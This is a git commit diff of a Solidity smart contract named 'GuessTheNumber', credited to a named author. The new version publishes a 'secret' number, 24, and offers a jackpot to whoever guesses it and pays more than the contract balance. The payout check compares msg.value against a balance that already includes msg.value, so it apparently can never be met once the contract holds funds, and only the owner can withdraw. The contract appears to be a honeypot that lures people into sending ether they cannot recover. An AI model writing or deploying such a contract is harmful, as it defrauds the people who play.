9eafbc879f523717365cc0f0a09a124540568cb9
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 15:43:48 +0700

    add contract GuessTheNumber

--- GuessTheNumber.sol
+++ GuessTheNumber.sol
@@ -1,23 +1,23 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GuessTheNumber at 0x0e77cb9d68B8Bf3cC41561f8edA6c71E4A4b9ef7
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GuessTheNumber at 0xc7e4a9147601fdbc7d1c2fb8b6c2ffcb2469f293
 */
 pragma solidity ^0.4.19;
-
 contract GuessTheNumber {
-    address public owner = msg.sender;
-    bytes32 secretNumberHash = 0x04994f67dc55b09e814ab7ffc8df3686b4afb2bb53e60eae97ef043fe03fb829;
 
-    function withdraw() public {
-        require(msg.sender == owner);
-        owner.transfer(this.balance);
+    address private Owner = msg.sender;
+    uint public SecretNumber = 24;
+
+    function() public payable {}
+   
+    function Withdraw() public {
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
     }
-
-    function guess(uint8 number) public payable {
-        // guessed number is correct, cost of attempt is paid and
-        // each next attempt should be more expensive than previous
-        if (keccak256(number) == secretNumberHash && msg.value >= 1 ether && msg.value >= this.balance) {
-            // send the jack pot
-            msg.sender.transfer(this.balance + msg.value);
+    
+    function Guess(uint n) public payable {
+        if(msg.value >= this.balance && n == SecretNumber && msg.value > 0.25 ether) {
+            // Previous Guesses makes the number easier to guess so you have to pay more
+            msg.sender.transfer(this.balance+msg.value);
         }
     }
 }
